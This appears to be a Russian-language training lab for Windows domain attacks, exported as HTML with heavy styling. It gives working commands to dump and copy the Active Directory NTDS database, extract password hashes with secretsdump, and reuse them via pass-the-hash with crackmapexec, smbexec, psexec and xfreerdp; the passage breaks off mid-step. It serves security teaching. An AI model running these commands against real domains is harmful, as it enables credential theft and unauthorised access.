@@ -1,0 +1,685 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Практическая работа №6.1 Базовые атаки на Windows-инфраструктуру.</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 237, 214, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 237, 214, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(249, 228, 188, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="f2f72c65-230f-49b9-90af-8c332824c347" class="page sans"><header><h1 class="page-title">Практическая работа №6.1 Базовые атаки на Windows-инфраструктуру.</h1><p class="page-description"></p></header><div class="page-body"><hr id="4a6db943-ea95-4b28-a442-dd58aca8315f"/><h1 id="539f6e1a-1898-4ff0-8b05-a114c4adc237" class="">Занятие 6 - <em>Базовые атаки и компрометация доменной Windows-инфраструктуры</em></h1><h1 id="52c5d437-be3f-4cdd-a05f-31baa4a1b88c" class="">Задание:</h1><p id="698b96de-3201-4de5-9461-317598c45f56" class="">1) Провести анализ базы NTDS</p><p id="cca9c32a-b547-4b95-90e7-7fdb3f6a1f53" class="">2) Выполнить атаку “Path-the-hash”</p><p id="5d37d86d-a3e8-42af-be0d-f3548bb58d6f" class="">3) Реализовать атаки на базовые протоколы Windows</p><p id="bb953ecf-b473-47f7-aa9f-c6bb301ac726" class="">
+</p><h1 id="62512dc0-de46-40dd-b22b-df3a29056e14" class="">Методический материал:</h1><h2 id="6a5b797d-75d4-4f7d-be7e-10cdad106580" class="">Часть 1. Базовые атаки на инфраструктуру Windows</h2><h3 id="0251dadb-2512-4aaf-968b-157bcf6c8c2e" class="">Этап 1. Анализ базы NTDS</h3><h3 id="f9928383-3ae6-41e2-bbd6-21be57292ce6" class="">1.1 Бэкап NTDS</h3><p id="1a1b3c16-e71f-461b-ac81-6a0ba7c7d6b0" class="">Воспользуемся базовыми средствами Windows для работы с NTDS. Необходимо зайти в командную строку от имени администратора и ввести команды:</p><blockquote id="46680ccc-af54-4b34-9659-5b76bee19b7a" class="">ntdsutil<br/>activate instance ntds<br/>ifm<br/>create full C:\temp<br/></blockquote><p id="c7d9dfb8-a5ce-472a-b6f6-c8fd9a8e9ef4" class="">Этот набор команд активирует процесс Install From Media, позволяющий сделать копию нашего NTDS с необходимыми ветками реестра.</p><p id="f5f2433b-0e4e-485f-b432-b0e1f05839db" class="">Эти же команды приведены на скриншоте ниже:</p><hr id="14f84ade-3aeb-45ca-8fd0-5699d7304d38"/><figure id="05e6f1e5-2eaa-4135-a07c-d6e9d57c3039" class="image"><a href="https://i.imgur.com/8z4DLNk.png"><img src="https://i.imgur.com/8z4DLNk.png"/></a></figure><hr id="d932ef48-ce83-49dd-80a1-b5f950fb2dac"/><p id="5115017c-5a27-415c-99bf-049d5388fde0" class="">После этого в директории C:\temp вы увидите созданые файлы дампа</p><hr id="953830f5-dd48-48d0-873b-99ba6ba64934"/><h3 id="8f31b525-d340-4f63-9964-29ed3e5cb8ee" class="">1.2 Перенос NTDS</h3><p id="f29faeff-6709-41ce-a234-3b0159081efa" class="">Воспользуемся базовыми средствами Kali Linux. С помощью SMB зайдём на сервер Win с Kali:</p><blockquote id="cdac9844-3900-4902-a281-4b5fd99ee78e" class="">smbclient  &#x27;\\\\\\192.168.10.200\\C$&#x27; -U PT/Administrator<ul id="acd3dfbb-54f5-49ed-aad2-a99d8eca65a2" class="bulleted-list"><li style="list-style-type:disc">где 192.168.10.201 -- ip адрес контроллера домена,</li></ul><ul id="e6843ced-3329-4a8f-bd76-00e962f1bb05" class="bulleted-list"><li style="list-style-type:disc">testdomain -- имя домена,</li></ul><ul id="5be4ea60-09cf-49ee-9088-9e6e198692e6" class="bulleted-list"><li style="list-style-type:disc">Administrator -- имя учетной записи с правами администратора.</li></ul></blockquote><p id="17f3dceb-2332-4f23-a5d1-f44d15d83620" class="">После чего скопируем файлы на Kali:</p><blockquote id="3b044242-de41-4856-b3ea-58f1b7079ee7" class="">recurse ON<br/>prompt OFF<br/>lcd /home/user<br/>mget temp<br/><ul id="dc6cb1ea-54a9-4bcf-a7a7-39f7b9899ace" class="bulleted-list"><li style="list-style-type:disc">где /home/user -- домашняя папка пользователя Kali linux</li></ul></blockquote><p id="c70a1691-c423-408d-9ed8-1bdb07a1bd46" class="">Эти же команды приведены на скриншоте ниже:</p><hr id="bb152574-0709-4ab0-af38-5d9b258dd9bb"/><figure id="95ed9cc7-5e6b-4538-883c-8148e0ed005d" class="image"><a href="https://i.imgur.com/FghSze0.png"><img src="https://i.imgur.com/FghSze0.png"/></a></figure><hr id="fdf2e306-b6d9-4b0c-8916-93b7d4c337d6"/><h3 id="df13d05e-d2dc-4dd4-832a-ccb8af00dcc4" class="">1.3 Анализ NTDS</h3><p id="1029e54e-b908-44bf-afa0-877623c7a67e" class="">Для анализа дампа для начала нужно скачать impacket. Находясь в домашней директории пользователя, выполните набор команд:</p><blockquote id="0d910a0a-6f83-43e1-99d6-9b19bfd0d3a3" class="">git clone https://github.com/SecureAuthCorp/impacket<br/>apt install python3-pip<br/>cd impacket<br/>pip install .<br/><ul id="1df47093-5921-4bfd-9e33-2c4b2bfd8d3e" class="bulleted-list"><li style="list-style-type:disc">У kali linux должен быть выход в интернет</li></ul><ul id="0228f93e-fd4b-497b-9f4d-4c460c2af2d5" class="bulleted-list"><li style="list-style-type:disc">У четвертой команды в конце точка. Будьте внимательны, это часть команды.</li></ul></blockquote><p id="c765915f-ed6e-4982-b66e-9a3d8b16f42b" class="">После установки нужно пройти из директории impacket в директорию examples (она внутри папки импакета) и выполнить следующую команду:</p><blockquote id="7544f806-3091-47e5-b22c-7b508d49d2b9" class="">python3 secretsdump.py -ntds /home/kali/temp/Active\ Directory/ntds.dit -system /home/kali/temp/registry/SYSTEM LOCAL<ul id="d7a99a6a-f16d-42a6-abb4-373b615cc463" class="bulleted-list"><li style="list-style-type:disc">где <a href="http://secretsdump.py/">secretsdump.py</a> -- исполняемый скрипт,</li></ul><ul id="289d6717-5039-431a-a399-4fd0791f7346" class="bulleted-list"><li style="list-style-type:disc">ntds.dit -- анализируемый инстанс базы данных NTDS,</li></ul><ul id="86521435-c74c-4e7d-9bcf-e5fddff8b386" class="bulleted-list"><li style="list-style-type:disc">registry/SYSTEM -- ветка реестра, с помощью которой мы можем прочитать NTDS,<br/>LOCAL -- флаг для скрипта, который говорит, что мы анализируем NTDS локально.<br/></li></ul><ul id="5db62d28-4814-49ad-a519-5942f5d70295" class="bulleted-list"><li style="list-style-type:disc">Внимательно следите за слешами -- мы экранируем пробелы обратным слешем.</li></ul></blockquote><p id="b1ea8193-f91e-4fac-8847-139504204dfa" class="">В качестве вывода будет примерно следующая картинка:</p><hr id="bc5ccb25-3378-4eab-9495-7b37e7e1541c"/><figure id="400add1e-a7fc-42ff-b88a-66e076238f4e" class="image"><a href="https://i.imgur.com/5e8qL39.png"><img src="https://i.imgur.com/5e8qL39.png"/></a></figure><hr id="2d212127-e8d9-4f7e-87f1-8744b7ae07d8"/><p id="998b45bc-445f-4676-a204-880bf5fc10f9" class="">Будьте внимательны -- формат информации в этом выводе описан в строчке &quot;dumping domain credentian&quot;</p><hr id="5cf93849-4ad0-4efb-b4c0-f928d73b585f"/><p id="6f2b9725-fecb-48c5-b723-1bf105347618" class="">NTDS мы анализируем с целью разобраться в структуре базы аутентификационых данных для объектов домена. После анализа бэкап удалять с кали не стоит, он пригодится на последующих занятиях, если вдруг мы случайно сломаем домен.<br/><br/><code>P.S. сломаем, и не случайно.</code></p><hr id="4419b2e0-3494-4f31-9ba2-bf4be967ff87"/><h3 id="71702dd3-1885-4367-a881-48a5d71530e8" class="">Этап 2. Path-the-hash</h3><p id="2de0bdb7-95c0-45f7-9cba-3b3bbeacfe93" class=""><em>Для выполнения данной части практики необходимы виртуальные машины Kali linux, win10 и DC1.</em></p><p id="408ac636-d350-46b2-84e4-3d5718c0efeb" class="">Для выполнения атаки вида PtH нам понадобится учетная запись и её хэш пароля. С помощью такой атаки мы можем выполнять любые действия, доступные пользователю, не имея оригинала пароля.</p><h3 id="8b58c12e-b066-4ade-a6f5-4e39e952d88c" class="">2.1 Crackmapexec</h3><p id="a663a3b2-48f6-4c9e-90f3-79097fe3cbb9" class="">Это набор python-скриптов для тестирования Windows окружения. Использует Windows API, поэтому обнаружить довольно сложно.</p><p id="33a2bf0c-d6e1-4918-94ec-f0f6c5f52d34" class="">Самое базовое применение -- быстрое сканирование сети и обнаружение хостов, как либо взаимодействующих с протоколом smb:</p><blockquote id="c38da158-e9c4-4c53-91b9-33490f45e415" class="">crackmapexec smb 192.168.10.0/24</blockquote><p id="30f6201b-9c49-474a-9c81-472ff8c4e230" class="">Можно выполнять команды от имени пользователя на удаленной машине посредством командной строки:</p><blockquote id="e72492a8-17bb-4b87-a4cc-f4f5db0c6f1f" class="">crackmapexec smb 192.168.10.201 -u Administrator -H hash -x whoami<ul id="1afcb88e-a0ae-4e62-8a81-3379d1bb6e5e" class="bulleted-list"><li style="list-style-type:disc">Где hash -- это NTLM хэш учетной записи (LM хэш в этом скрипте не используется, в отличие от скрипта smbexec, описанного далее).</li></ul></blockquote><p id="6dd5ffc0-1e5b-4c2f-83cd-f20ed367927c" class="">Можно посмотреть и список сетевых папок, доступных конкретному пользователю:</p><blockquote id="398a6cb9-4e19-49d6-a54a-eac869ebd741" class="">crackmapexec smb 192.168.10.201 -u Administrator -H hash --shares</blockquote><p id="f5bdb466-d2fa-4fb7-81b5-3199dd89eeb7" class="">А ещё в impacket есть интересная утилита <strong>smbexec</strong>, позволяющая запустить cmd windows для удаленной передачи команд, при этом практически <a href="https://habr.com/ru/company/varonis/blog/514918/">не оставляя следов</a>:</p><blockquote id="199e2688-26f9-46ef-8ec3-d2e6c842c4e7" class="">python3 smbexec.py PT/administrator@192.168.10.200 -hashes aad3b435b51404eeaad3b435b51404ee:05df2fd1109e3d3b60f110965f6af128<ul id="0651b539-f05c-4a49-a0ab-3e739793145a" class="bulleted-list"><li style="list-style-type:disc">где testdomain -- имя домена,</li></ul><ul id="846aa0fb-6cf5-4f30-becc-5d27c37ecdf5" class="bulleted-list"><li style="list-style-type:disc">administrator -- имя пользователя,</li></ul><ul id="1fca4daf-8d76-4d34-8483-10cf67c0baf2" class="bulleted-list"><li style="list-style-type:disc">192.168.10.200 -- адрес компьютера-жертвы</li></ul><ul id="6645bdeb-d965-472f-8c53-fcf4d84214f9" class="bulleted-list"><li style="list-style-type:disc">hashes -- спец флаг для использования хэша</li></ul><ul id="84f38b10-5989-476e-bf4a-03046c953402" class="bulleted-list"><li style="list-style-type:disc">последняя длинная фраза -- сам хэш в определенном формате</li></ul></blockquote><p id="ff2da76d-fb19-4314-a0b1-74d9d594b6bc" class="">Вот так получится:</p><hr id="dae5c0d9-ac52-4664-9946-953c92741772"/><figure id="b0ce54f6-477b-4c7c-8bf7-1107d7ec9f5e" class="image"><a href="https://i.imgur.com/GMTURNN.png"><img src="https://i.imgur.com/GMTURNN.png"/></a></figure><hr id="5f317cfa-2aa7-49aa-894e-54486fa058dc"/><p id="1ab68bd8-bb11-44fa-b460-40ab3676ac87" class="">Есть аналог -- psexec</p><blockquote id="a37cc8c3-9a90-4181-9e80-5c92e18a3be6" class="">python3 psexec.py domain/username:password@hostIP<br/>python3 psexec.py domain/username@hostIP -hashes LMHASH:NTHASH<br/></blockquote><h3 id="5143364c-4e2c-438c-afb9-8fcbb4892225" class="">2.2 XFreeRDP</h3><p id="c556c047-5d57-4ec5-85b7-f0c9bad29a37" class="">С хешем можно зайти даже по RDP. Для этого используется следующая команда</p><blockquote id="ed910b3f-d134-4f56-83ac-b9fb85dac1f5" class="">xfreerdp /d:domainname /u:username /v:ipaddr /pth:NTHASH</blockquote><p id="ed2cfcc1-8ef4-4ee9-ba05-1a3860646622" class="">Но для начала включим удалённый доступ по RDP на dc1, доступ дадим администраторам домена</p><hr id="5e2b29c5-1cef-4700-b3bb-1fcb9fad252d"/><figure id="b4c5aeb7-0aff-4d3c-a000-89a8417abcc0" class="image"><a href="https://i.imgur.com/ekWO2iR.png"><img src="https://i.imgur.com/ekWO2iR.png"/></a></figure><hr id="30a87be0-1e18-4f21-bb0b-790761bb8e63"/><figure id="7d3f25cb-45b7-4979-9455-796472b0c135" class="image"><a href="https://i.imgur.com/pe89GOe.png"><img src="https://i.imgur.com/pe89GOe.png"/></a></figure><hr id="8bd114ba-fe10-477c-9498-9b00dbd3bdf4"/><p id="57dc13a1-4cbe-4b4f-a21e-66050968bfdc" class="">Попробуем зайти на dc1</p><hr 